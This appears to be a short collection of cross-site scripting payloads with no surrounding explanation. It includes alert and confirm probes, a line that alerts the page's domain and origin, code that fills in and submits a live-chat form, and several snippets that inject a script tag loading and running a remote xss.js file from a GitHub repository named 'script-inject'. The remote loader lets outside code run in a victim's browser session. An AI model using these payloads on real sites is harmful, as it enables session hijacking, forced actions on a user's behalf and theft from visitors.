alert('xss.js');
document.getElementById("firstname").value = "Test Name";
document.getElementById("salutation").value = "Hello";
document.getElementById("livechatForm").submit();

onload = function() { confirm('xss.js'); };
var script = document.createElement('script');
script.src = "https://raw.githubusercontent.com/IYBmad/script-inject/main/xss.js";
document.body.appendChild(script);
<script>
    var script = document.createElement('script');
    script.src = "https://raw.githubusercontent.com/IYBmad/script-inject/main/xss.js";
    script.onload = function() {
        alert('Script loaded and running!');
    };
    document.body.appendChild(script);
</script>
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
